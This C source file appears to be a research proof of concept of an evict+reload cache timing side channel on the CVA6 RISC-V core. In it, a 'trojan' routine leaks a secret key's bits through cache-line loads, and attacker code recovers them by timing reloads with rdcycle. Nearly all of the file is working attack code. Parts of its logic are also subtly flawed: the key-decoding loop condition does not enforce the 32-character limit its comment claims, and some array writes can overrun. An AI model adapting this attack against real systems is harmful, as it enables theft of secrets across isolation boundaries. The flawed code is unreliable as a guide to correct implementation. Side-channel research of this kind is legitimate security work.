/*Implemented an evict reload instead of flush and reload because CVA6 doesnt have a built-in clflush command*/
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>
#include <unistd.h>

#define CACHE_SETS 256
#define CACHE_WAYS 8
#define CACHE_LINE_SIZE 16
#define cache_size (CACHE_SETS * CACHE_WAYS * CACHE_LINE_SIZE) / CACHE_LINE_SIZE

#define iterations 200 	//number of times to run the attack
#define threshold 30	//threshold above which we have a cache miss
	
volatile unsigned hit[cache_size] = {0};	//array which holds the hits of each cache line

__uint128_t sharedarray[cache_size] __attribute__((aligned(128))) = {16};	//shared array between attacker and victim




/********helper function to convert string to bits**********/


char* stringToBinary(char* s) {
    if(s == NULL) return 0; /* no input string */
    size_t len = strlen(s);   
    char *binary = malloc(len*8 + 1); // each char is one byte (8 bits) and + 1 at the end for null terminator
    binary[0] = '\0';   
    for(size_t i = 0; i < len; ++i) {
        char ch = s[i];
        for(int j = 7; j >= 0; --j){
            if(ch & (1 << j)) {
                strcat(binary,"1");
            } else {
                strcat(binary,"0");
            }
        }
    }
    return binary;
}




/*************EVICT CACHE******************/

//instead of using the clflush command we can evict the cache by loading an empty array into it
void evictcache(){
	__uint128_t evictarray[cache_size];
	__uint128_t temp = 1;
	for (int i = 0 ; i < cache_size ; i++ ){
		evictarray[i] = 0;		
		temp = evictarray[i];	//read it in order to load the array into the cache
	}
}



/*************RELOAD FUNCTION******************/

//read which elements of the array have been loaded into the cache
void reload(__uint128_t *array){
	__uint128_t temp = 1;	//temp variable to read the array data in order to load them into the cache
	register unsigned long start,end,diff;	//variables to measure access time
	for ( int i = 0 ; i < cache_size ; i++){
		asm volatile ("rdcycle %0" : "=r" (start));
		temp = array[i];
		asm volatile ("rdcycle %0" : "=r" (end));
		diff = end - start;
		if(diff < threshold){
			hit[i]++;
		}
	}
}



/**************TROJAN CODE*********************/

void trojan(char *key){
	//trojan will load specific cache lines according to the bits of the secret key
	__uint128_t temp = 16;
	//transform the key into bits
	char* key_bits;
	key_bits = stringToBinary(key);
	size_t keylength = strlen(key_bits);
	//load the sets starting from 0 if the bit is 1, otherwise dont load
	for ( int i = 0 ; i < cache_size; i++){
		if (i%256 == 0){
			for (int j = 0 ; j < keylength; j++){
				if(key_bits[j] == '1'){
					sharedarray[i+j] = 150;
					temp = sharedarray[i+j];
				}
			}

		}
	}
}


/*************VICTIM FUNCTION******************/

void victim(){
	char *key = "SecretKeyInTheCVA6";
	trojan(key);
}


/**************function to reconstruct the secret key***************/

void reconstruct(int *bin_key){
	int octave = 0 ;	//specifies the octave of bits we are decoding
	char *decoded_key = (char *)malloc((octave+1)*sizeof(char));	//alocate memory for 1 character

	//keep decoding untill we hit 8 bits of 0 which indicate end of string or we have read the entire bin_key array
	int end = 0 ;
	int num, z, j;
	while(end == 0 || octave == 32){		//we can read upto 32 characters because the bin_key is of size 256
		num = 0 ;
		z = 0;
		for (j = 7 ; j >= 0 ; j --){		//calculate the ascii code of the character
			num = num + (bin_key[(octave*8)+j] << z);
			z++;
		}
		if ( num != 0 ){
			decoded_key[octave] = num;
			octave++;
			decoded_key = realloc(decoded_key,((octave+1)*sizeof(char)));
		}
		else {
			decoded_key[octave] = '\0';
			end = 1;
		}		
	}

	printf("Decoded key is %s\n",decoded_key);
}




/***********function to read the loaded sets***************/

void read_sets(){
	int i = 0;
	int loaded_ways[256] = {0};	//keep amount of ways in each set that got loaded into the cache
	int hits = 0 ;
	//find out how many ways of each set got loaded into the cache
	for(i = 0 ; i < cache_size ; i++){
		int way = i/256;
		int set = i - (way*256);
		if(hit[i] > 70){
			//printf("Index %d, Cache way %d, Set %d got loaded %d times\n",i,way,set,hit[i]);
			loaded_ways[set]++;
			hits++;
		}
		
	}

	int total_sets_loaded = 0 ;
	int set_loaded[256] = {0};	//array which specifies which sets are loaded and which not
	//if a set got at least 6 of its 8 ways loaded then its an loaded set
	for(i = 0 ; i < 256; i++){
		if(loaded_ways[i] > 5){
			printf("Set %d got %d hits\n",i,loaded_ways[i]);
			total_sets_loaded++;
			set_loaded[i] = 1;
		}
	}

	printf("Total hits %d\n",hits);
	printf("Total sets loaded %d\n",total_sets_loaded);

	reconstruct(set_loaded);	//reconstruct the key
}



/**********MAIN**********/


int main(){

	//run the attack iterations number times
	for (int i = 0 ; i < iterations ; i ++){
		evictcache();		//evict the cache
		victim();			//let the victim execute
		reload(sharedarray);		//reload the array to find which sets got loaded into the cache
	}

	read_sets();


	return 0;

}